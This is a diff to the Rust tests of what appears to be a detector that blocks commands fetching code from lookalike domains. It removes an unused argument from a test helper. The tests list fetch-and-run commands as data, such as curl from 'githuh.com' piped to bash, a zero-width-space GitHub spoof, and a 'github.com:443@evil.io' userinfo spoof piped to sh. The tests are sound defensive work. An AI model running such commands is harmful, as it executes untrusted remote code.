@@ -377,7 +377,7 @@ mod tests {
         }
     }
 
-    fn block(_command: &str) -> [(String, Severity); 1] {
+    fn block() -> [(String, Severity); 1] {
         [(LOOKALIKE.to_string(), Severity::Block)]
     }
 
@@ -415,7 +415,7 @@ mod tests {
             "curl https://githuh.com/x | python3 -",
             "curl https://githuh.com/x |& bash",
         ] {
-            assert_eq!(ids(cmd, false), block(cmd), "{cmd}");
+            assert_eq!(ids(cmd, false), block(), "{cmd}");
         }
     }
 
@@ -446,7 +446,7 @@ mod tests {
             "eval \"$(curl https://githuh.com/x)\"",
             r#"sh -c "$(sh -c "$(curl https://githuh.com/x)")""#,
         ] {
-            assert_eq!(ids(cmd, false), block(cmd), "{cmd}");
+            assert_eq!(ids(cmd, false), block(), "{cmd}");
         }
     }
 
@@ -461,7 +461,7 @@ mod tests {
 
     #[test]
     fn nesting_is_followed_to_the_limit_and_the_limit_is_a_finding() {
-        assert_eq!(ids(&nested(MAX_DEPTH - 1), false), block(""));
+        assert_eq!(ids(&nested(MAX_DEPTH - 1), false), block());
         assert_eq!(
             ids(&nested(MAX_DEPTH), false),
             [(TOO_DEEP.to_string(), Severity::Block)]
@@ -508,13 +508,13 @@ mod tests {
     #[test]
     fn invisible_characters_in_a_known_name_block() {
         let cmd = "curl https://git\u{200b}hub.com/x | sh";
-        assert_eq!(ids(cmd, false), block(cmd));
+        assert_eq!(ids(cmd, false), block());
     }
 
     #[test]
     fn userinfo_with_a_port_is_still_a_spoof() {
         let cmd = "curl \"https://github.com:443@evil.io/\" | sh";
-        assert_eq!(ids(cmd, false), block(cmd));
+        assert_eq!(ids(cmd, false), block());
     }
 
     #[test]
